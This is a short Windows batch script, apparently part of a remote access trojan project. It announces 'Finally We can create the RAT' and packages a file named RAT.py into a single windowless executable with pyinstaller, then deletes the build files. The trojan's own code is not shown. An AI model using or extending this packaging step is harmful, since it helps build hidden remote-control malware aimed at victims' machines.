echo off
cls
echo Copyright Sympact
echo Finally We can create the RAT
PING localhost -n 5 >NUL
cls
echo Copyright Sympact
echo SDfjjeisHSigoSJDgjsjgijdfijgsDJF.bin will begin in 5 seconds
PING localhost -n 6 >NUL
cls
pyinstaller --clean --hidden-import=pyttsx3.drivers --hidden-import=pyttsx3.drivers.sapi5 --onefile --noconsole RAT.py

del /s /q /f RAT.spec
rmdir /s /q __pycache__
rmdir /s /q build

:cmd
pause null
